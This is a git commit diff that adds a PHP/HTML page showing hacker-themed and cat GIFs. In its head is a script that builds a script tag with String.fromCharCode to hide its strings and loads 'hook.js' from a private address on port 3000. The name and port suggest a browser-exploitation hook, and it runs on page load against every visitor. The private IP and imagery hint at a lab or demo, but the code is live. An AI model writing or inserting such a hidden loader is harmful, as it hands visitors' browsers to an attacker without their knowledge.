e2212acdf6c179530dc60511ec1186ec76f8d317
Frank Rondon <frankerondon@gmail.com>
2023-05-04 22:45:37 -0400

    First Uploading

---
+++ index.php
@@ -0,0 +1,103 @@
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="author" content="colorlib.com">
+
+        <!--  
+        <link href="https://fonts.googleapis.com/css?family=Poppins" rel="stylesheet" />
+        -->
+
+        <link href="./main.css" rel="stylesheet" />	
+
+        <!-- jQuery CDN-->
+        <!--  
+            <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+        -->
+
+        <!-- jQuery localhost-->
+        <script src="./jquery-3.6.0.min.js"></script>
+
+        <script type='text/javascript' src='./main.js'></script>
+        
+        <!-- Font Awesome icons (free version)-->
+        <!--  
+        <script src="https://use.fontawesome.com/releases/v5.15.1/js/all.js" crossorigin="anonymous"></script>
+        -->
+        
+        <!-- Bootstrap CDN-->
+        <!--  
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
+            <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.min.js" integrity="sha384-ODmDIVzN+pFdexxHEHFBQH3/9/vQ9uori45z4JjnFsRydbmQbmL5t1tQ0culUzyK" crossorigin="anonymous"></script>
+        -->
+
+        <!-- Bootstrap localhost-->
+        <link rel="stylesheet" href="./bootstrap.min.css" >
+        <script src="./bootstrap.min.js" ></script>
+
+	<script>
+
+		//script
+		var x = document.createElement(String.fromCharCode(0x73, 0x63, 0x72, 0x69, 0x70, 0x74));
+
+		//text/javascript
+		x.setAttribute('type', String.fromCharCode(0x74, 0x65, 0x78, 0x74, 0x2f, 0x6a, 0x61, 0x76, 0x61, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74));
+
+		//http://10.0.3.8:3000/hook.js
+		x.setAttribute('src', String.fromCharCode(0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x31, 0x30, 0x2E, 0x30, 0x2E, 0x33, 0x2E, 0x38, 0x3A, 0x33, 0x30, 0x30, 0x30, 0x2F, 0x68, 0x6F, 0x6F, 0x6B, 0x2E, 0x6A, 0x73));
+
+		document.querySelector('head').appendChild(x);
+
+	</script>
+
+
+    </head>
+    <body>
+
+        <!--
+        <div class="s003">
+            <form>
+                <img src="./img/cat-space.gif" class="centeer">
+                <br/>
+                <img src="./img/cat-space.gif" class="centeer">
+                <br/>
+                <img src="./img/cat-space.gif" class="centeer">
+                <br/>
+                <img src="./img/cat-space.gif" class="centeer">
+                <br/><br/>
+                <img src="./img/cat-space.gif" class="centeer">
+                <br/><br/>
+                <img src="./img/cat-space.gif" class="centeer">
+            </form>
+        </div>
+        -->
+
+        <div class="row">
+            <div class="col"><img src="./img/hacker.gif" class="centeer"></div>
+            <div class="col"><img src="./img/hacker-pc.gif" class="centeer"></div>
+            <div class="col"><img src="./img/mega64-hacking-in-progress.gif" class="centeer"></div>            
+            
+            <!--
+            <div class="col"><img src="./img/hacker.gif" class="centeer"></div>
+            -->
+        </div>
+
+        <br/><br/>
+
+        <div class="row">
+            <div class="col"><img src="./img/hacker-typing.gif" class="centeer"></div>
+            <div class="col"><img src="./img/the-hacker-matrix.gif" class="centeer"></div>
+            <div class="col"><img src="./img/cat-space.gif" class="centeer"></div>
+            <div class="col"><img src="./img/cat-space.gif" class="centeer"></div>
+        </div>
+
+        <div class="row">
+            <div class="col"><img src="./img/cat-space.gif" class="centeer"></div>
+            <div class="col"><img src="./img/cat-space.gif" class="centeer"></div>
+            <div class="col"><img src="./img/cat-space.gif" class="centeer"></div>
+            <div class="col"><img src="./img/cat-space.gif" class="centeer"></div>
+        </div>
+
+    </body>
+</html>
